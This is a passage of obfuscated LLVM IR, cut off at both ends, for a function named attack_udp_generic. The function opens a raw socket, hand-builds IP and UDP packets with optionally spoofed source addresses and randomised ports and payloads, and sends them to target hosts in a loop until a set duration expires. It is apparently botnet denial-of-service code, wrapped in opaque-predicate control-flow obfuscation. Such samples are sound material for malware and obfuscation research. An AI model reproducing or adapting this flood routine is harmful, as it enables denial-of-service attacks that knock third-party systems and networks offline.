  %915 = zext i8 %914 to i32
  %916 = icmp slt i32 %913, %915
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %681
  %917 = load i8, i8* %27, align 1
  %918 = icmp ne i8 %917, 0
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %782
  %919 = call i64 @time(i64* null) #6
  %920 = load i32, i32* %28, align 4
  %921 = sext i32 %920 to i64
  %922 = icmp sgt i64 %919, %921
  br label %originalBB78
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 24, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %23, align 4
  %76 = load i16, i16* %20, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp sgt i32 %77, 1460
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %80

; <label>:80:                                     ; preds = %79, %5
  %81 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %81, i32* %12, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %100

; <label>:83:                                     ; preds = %80
  %84 = load i32, i32* @x.29
  %85 = load i32, i32* @y.30
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %83
  %92 = load i32, i32* @x.29
  %93 = load i32, i32* @y.30
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %458

; <label>:100:                                    ; preds = %80
  store i32 1, i32* %11, align 4
  %101 = load i32, i32* %12, align 4
  %102 = bitcast i32* %11 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %108

; <label>:105:                                    ; preds = %100
  %106 = load i32, i32* %12, align 4
  %107 = call i32 @close(i32 %106)
  br label %458

; <label>:108:                                    ; preds = %100
  store i32 0, i32* %11, align 4
  br label %109

; <label>:109:                                    ; preds = %207, %108
  %110 = load i32, i32* %11, align 4
  %111 = load i8, i8* %7, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp slt i32 %110, %112
  br i1 %113, label %114, label %210

; <label>:114:                                    ; preds = %109
  %115 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %116 = load i8**, i8*** %13, align 8
  %117 = load i32, i32* %11, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8*, i8** %116, i64 %118
  store i8* %115, i8** %119, align 8
  %120 = load i8**, i8*** %13, align 8
  %121 = load i32, i32* %11, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8*, i8** %120, i64 %122
  %124 = load i8*, i8** %123, align 8
  %125 = bitcast i8* %124 to %struct.iphdr*
  store %struct.iphdr* %125, %struct.iphdr** %24, align 8
  %126 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i64 1
  %128 = bitcast %struct.iphdr* %127 to %struct.udphdr*
  store %struct.udphdr* %128, %struct.udphdr** %25, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %130 = bitcast %struct.iphdr* %129 to i8*
  %131 = load i8, i8* %130, align 4
  %132 = and i8 %131, 15
  %133 = or i8 %132, 64
  store i8 %133, i8* %130, align 4
  %134 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, -16
  %138 = or i8 %137, 5
  store i8 %138, i8* %135, align 4
  %139 = load i8, i8* %14, align 1
  %140 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 1
  store i8 %139, i8* %141, align 1
  %142 = load i16, i16* %20, align 2
  %143 = zext i16 %142 to i64
  %144 = add i64 28, %143
  %145 = trunc i64 %144 to i16
  %146 = call zeroext i16 @htons(i16 zeroext %145) #7
  %147 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 2
  store i16 %146, i16* %148, align 2
  %149 = load i16, i16* %15, align 2
  %150 = call zeroext i16 @htons(i16 zeroext %149) #7
  %151 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 3
  store i16 %150, i16* %152, align 4
  %153 = load i8, i8* %16, align 1
  %154 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 5
  store i8 %153, i8* %155, align 4
  %156 = load i8, i8* %17, align 1
  %157 = icmp ne i8 %156, 0
  br i1 %157, label %158, label %162

; <label>:158:                                    ; preds = %114
  %159 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 4
  store i16 %159, i16* %161, align 2
  br label %162

; <label>:162:                                    ; preds = %158, %114
  %163 = load i32, i32* @x.29
  %164 = load i32, i32* @y.30
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %162
  %171 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 6
  store i8 17, i8* %172, align 1
  %173 = load i32, i32* %22, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 8
  store i32 %173, i32* %175, align 4
  %176 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %177 = load i32, i32* %11, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i64 %178
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %179, i32 0, i32 1
  %181 = load i32, i32* %180, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 9
  store i32 %181, i32* %183, align 4
  %184 = load i16, i16* %18, align 2
  %185 = call zeroext i16 @htons(i16 zeroext %184) #7
  %186 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %187 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %186, i32 0, i32 0
  store i16 %185, i16* %187, align 2
  %188 = load i16, i16* %19, align 2
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %191 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %190, i32 0, i32 1
  store i16 %189, i16* %191, align 2
  %192 = load i16, i16* %20, align 2
  %193 = zext i16 %192 to i64
  %194 = add i64 8, %193
  %195 = trunc i64 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %198 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %197, i32 0, i32 2
  store i16 %196, i16* %198, align 2
  %199 = load i32, i32* @x.29
  %200 = load i32, i32* @y.30
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %207

; <label>:207:                                    ; preds = %originalBBpart24
  %208 = load i32, i32* %11, align 4
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %11, align 4
  br label %109

; <label>:210:                                    ; preds = %109
  br label %211

; <label>:211:                                    ; preds = %457, %210
  store i32 0, i32* %11, align 4
  br label %212

; <label>:212:                                    ; preds = %originalBBpart261, %211
  %213 = load i32, i32* %11, align 4
  %214 = load i8, i8* %7, align 1
  %215 = zext i8 %214 to i32
  %216 = icmp slt i32 %213, %215
  br i1 %216, label %217, label %451

; <label>:217:                                    ; preds = %212
  %218 = load i8**, i8*** %13, align 8
  %219 = load i32, i32* %11, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8*, i8** %218, i64 %220
  %222 = load i8*, i8** %221, align 8
  store i8* %222, i8** %26, align 8
  %223 = load i8*, i8** %26, align 8
  %224 = bitcast i8* %223 to %struct.iphdr*
  store %struct.iphdr* %224, %struct.iphdr** %27, align 8
  %225 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i64 1
  %227 = bitcast %struct.iphdr* %226 to %struct.udphdr*
  store %struct.udphdr* %227, %struct.udphdr** %28, align 8
  %228 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %229 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %228, i64 1
  %230 = bitcast %struct.udphdr* %229 to i8*
  store i8* %230, i8** %29, align 8
  %231 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %232 = load i32, i32* %11, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %231, i64 %233
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %234, i32 0, i32 2
  %236 = load i8, i8* %235, align 4
  %237 = zext i8 %236 to i32
  %238 = icmp slt i32 %237, 32
  br i1 %238, label %239, label %260

; <label>:239:                                    ; preds = %217
  %240 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %241 = load i32, i32* %11, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %243, i32 0, i32 1
  %245 = load i32, i32* %244, align 4
  %246 = call i32 @ntohl(i32 %245) #7
  %247 = call i32 @rand_next()
  %248 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %249 = load i32, i32* %11, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i64 %250
  %252 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %251, i32 0, i32 2
  %253 = load i8, i8* %252, align 4
  %254 = zext i8 %253 to i32
  %255 = lshr i32 %247, %254
  %256 = add i32 %246, %255
  %257 = call i32 @htonl(i32 %256) #7
  %258 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 9
  store i32 %257, i32* %259, align 4
  br label %260

; <label>:260:                                    ; preds = %239, %217
  %261 = load i32, i32* @x.29
  %262 = load i32, i32* @y.30
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %260
  %269 = load i32, i32* %22, align 4
  %270 = icmp eq i32 %269, -1
  %271 = load i32, i32* @x.29
  %272 = load i32, i32* @y.30
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %270, label %279, label %283

; <label>:279:                                    ; preds = %originalBBpart28
  %280 = call i32 @rand_next()
  %281 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 8
  store i32 %280, i32* %282, align 4
  br label %283

; <label>:283:                                    ; preds = %279, %originalBBpart28
  %284 = load i16, i16* %15, align 2
  %285 = zext i16 %284 to i32
  %286 = icmp eq i32 %285, 65535
  br i1 %286, label %287, label %308

; <label>:287:                                    ; preds = %283
  %288 = load i32, i32* @x.29
  %289 = load i32, i32* @y.30
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %287
  %296 = call i32 @rand_next()
  %297 = trunc i32 %296 to i16
  %298 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 3
  store i16 %297, i16* %299, align 4
  %300 = load i32, i32* @x.29
  %301 = load i32, i32* @y.30
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %308

; <label>:308:                                    ; preds = %originalBBpart212, %283
  %309 = load i16, i16* %18, align 2
  %310 = zext i16 %309 to i32
  %311 = icmp eq i32 %310, 65535
  br i1 %311, label %312, label %317

; <label>:312:                                    ; preds = %308
  %313 = call i32 @rand_next()
  %314 = trunc i32 %313 to i16
  %315 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %316 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %315, i32 0, i32 0
  store i16 %314, i16* %316, align 2
  br label %317

; <label>:317:                                    ; preds = %312, %308
  %318 = load i32, i32* @x.29
  %319 = load i32, i32* @y.30
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %317
  %326 = load i16, i16* %19, align 2
  %327 = zext i16 %326 to i32
  %328 = icmp eq i32 %327, 65535
  %329 = load i32, i32* @x.29
  %330 = load i32, i32* @y.30
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %328, label %337, label %342

; <label>:337:                                    ; preds = %originalBBpart216
  %338 = call i32 @rand_next()
  %339 = trunc i32 %338 to i16
  %340 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 1
  store i16 %339, i16* %341, align 2
  br label %342

; <label>:342:                                    ; preds = %337, %originalBBpart216
  %343 = load i32, i32* @x.29
  %344 = load i32, i32* @y.30
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %342
  %351 = load i8, i8* %21, align 1
  %352 = icmp ne i8 %351, 0
  %353 = load i32, i32* @x.29
  %354 = load i32, i32* @y.30
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %352, label %361, label %369

; <label>:361:                                    ; preds = %originalBBpart220
  %362 = load i8*, i8** %29, align 8
  %363 = load i16, i16* %20, align 2
  %364 = zext i16 %363 to i32
  call void @rand_alphastr(i8* %362, i32 %364)
  %365 = load i8*, i8** %29, align 8
  %366 = load i16, i16* %20, align 2
  %367 = zext i16 %366 to i64
  %368 = getelementptr inbounds i8, i8* %365, i64 %367
  store i8 0, i8* %368, align 1
  br label %369

; <label>:369:                                    ; preds = %361, %originalBBpart220
  %370 = load i32, i32* @x.29
  %371 = load i32, i32* @y.30
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %369
  %378 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 7
  store i16 0, i16* %379, align 2
  %380 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %381 = bitcast %struct.iphdr* %380 to i16*
  %382 = call zeroext i16 @checksum_generic(i16* %381, i32 20)
  %383 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i32 0, i32 7
  store i16 %382, i16* %384, align 2
  %385 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %386 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %385, i32 0, i32 3
  store i16 0, i16* %386, align 2
  %387 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %388 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %389 = bitcast %struct.udphdr* %388 to i8*
  %390 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %391 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %390, i32 0, i32 2
  %392 = load i16, i16* %391, align 2
  %393 = load i16, i16* %20, align 2
  %394 = zext i16 %393 to i64
  %395 = add i64 8, %394
  %396 = trunc i64 %395 to i32
  %397 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %387, i8* %389, i16 zeroext %392, i32 %396)
  %398 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %399 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %398, i32 0, i32 3
  store i16 %397, i16* %399, align 2
  %400 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %401 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %400, i32 0, i32 1
  %402 = load i16, i16* %401, align 2
  %403 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %404 = load i32, i32* %11, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %403, i64 %405
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i32 0, i32 0
  %408 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %407, i32 0, i32 1
  store i16 %402, i16* %408, align 2
  %409 = load i32, i32* %12, align 4
  %410 = load i8*, i8** %26, align 8
  %411 = load i16, i16* %20, align 2
  %412 = zext i16 %411 to i64
  %413 = add i64 28, %412
  %414 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %415 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %416 = load i32, i32* %11, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = bitcast %struct.sockaddr_in* %419 to %struct.sockaddr*
  store %struct.sockaddr* %420, %struct.sockaddr** %414, align 8
  %421 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %422 = load %struct.sockaddr*, %struct.sockaddr** %421, align 8
  %423 = call i64 @sendto(i32 %409, i8* %410, i64 %413, i32 16384, %struct.sockaddr* %422, i32 16)
  %424 = load i32, i32* @x.29
  %425 = load i32, i32* @y.30
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBBpart246, label %originalBB22alteredBB

originalBBpart246:                                ; preds = %originalBB22
  br label %432

; <label>:432:                                    ; preds = %originalBBpart246
  %433 = load i32, i32* @x.29
  %434 = load i32, i32* @y.30
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %432
  %441 = load i32, i32* %11, align 4
  %442 = add nsw i32 %441, 1
  store i32 %442, i32* %11, align 4
  %443 = load i32, i32* @x.29
  %444 = load i32, i32* @y.30
  %445 = sub i32 %443, 1
  %446 = mul i32 %443, %445
  %447 = urem i32 %446, 2
  %448 = icmp eq i32 %447, 0
  %449 = icmp slt i32 %444, 10
  %450 = or i1 %448, %449
  br i1 %450, label %originalBBpart261, label %originalBB48alteredBB

originalBBpart261:                                ; preds = %originalBB48
  br label %212

; <label>:451:                                    ; preds = %212
  %452 = call i64 @time(i64* null) #6
  %453 = load i32, i32* %23, align 4
  %454 = sext i32 %453 to i64
  %455 = icmp sgt i64 %452, %454
  br i1 %455, label %456, label %457

; <label>:456:                                    ; preds = %451
  br label %458

; <label>:457:                                    ; preds = %451
  br label %211

; <label>:458:                                    ; preds = %456, %105, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %83
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %162
  %459 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %460 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %459, i32 0, i32 6
  store i8 17, i8* %460, align 1
  %461 = load i32, i32* %22, align 4
  %462 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 8
  store i32 %461, i32* %463, align 4
  %464 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %465 = load i32, i32* %11, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %467, i32 0, i32 1
  %469 = load i32, i32* %468, align 4
  %470 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 9
  store i32 %469, i32* %471, align 4
  %472 = load i16, i16* %18, align 2
  %473 = call zeroext i16 @htons(i16 zeroext %472) #7
  %474 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %475 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %474, i32 0, i32 0
  store i16 %473, i16* %475, align 2
  %476 = load i16, i16* %19, align 2
  %477 = call zeroext i16 @htons(i16 zeroext %476) #7
  %478 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %479 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %478, i32 0, i32 1
  store i16 %477, i16* %479, align 2
  %480 = load i16, i16* %20, align 2
  %481 = zext i16 %480 to i64
  %_ = sub i64 8, %481
  %gen = mul i64 %_, %481
  %482 = add i64 8, %481
  %483 = trunc i64 %482 to i16
  %484 = call zeroext i16 @htons(i16 zeroext %483) #7
  %485 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %486 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %485, i32 0, i32 2
  store i16 %484, i16* %486, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %260
  %487 = load i32, i32* %22, align 4
  %488 = icmp eq i32 %487, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %287
  %489 = call i32 @rand_next()
  %490 = trunc i32 %489 to i16
  %491 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %492 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %491, i32 0, i32 3
  store i16 %490, i16* %492, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %317
  %493 = load i16, i16* %19, align 2
  %494 = zext i16 %493 to i32
  %495 = icmp eq i32 %494, 65535
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %342
  %496 = load i8, i8* %21, align 1
  %497 = icmp ne i8 %496, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %369
  %498 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %499 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %498, i32 0, i32 7
  store i16 0, i16* %499, align 2
  %500 = load %struct.iphdr*, %struct.iphdr** %27, align 8
